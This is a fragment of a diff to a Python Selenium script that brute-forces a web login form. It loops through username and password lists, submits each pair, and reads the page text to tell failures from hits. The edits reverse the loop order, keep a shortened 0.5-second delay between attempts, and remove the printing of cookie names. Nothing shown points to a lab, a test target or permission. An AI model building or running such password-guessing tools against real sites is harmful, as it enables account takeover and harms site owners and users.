@@ -71,8 +71,8 @@ try:
     total_attempts = len(usernames) * len(passwords)
     attempt = 0
     
-    for password in passwords:
-        for username in usernames:
+    for username in usernames:
+        for password in passwords:
             attempt += 1
             print(f"\n📝 [{attempt}/{total_attempts}] Trying: {username} / {password}")
             
@@ -92,7 +92,7 @@ try:
                 password_field.send_keys(password)
                 
                 password_field.submit()
-                time.sleep(0.5)  # Reduced from 3 to 0.5 seconds
+                time.sleep(0.5)
                 
                 current_url = driver.current_url
                 page_source = driver.page_source.lower()
@@ -110,10 +110,7 @@ try:
                 elif "invalid email or password" in page_source:
                     print(f"❌ Failed: {username}")
                 else:
-                    print(f"❓ Unknown response - checking cookies...")
-                    cookies = driver.get_cookies()
-                    if cookies:
-                        print(f"   Cookies: {[c['name'] for c in cookies]}")
+                    print(f"❓ Unknown response")
                     
             except Exception as e:
                 print(f"⚠️ Error on attempt: {e}")
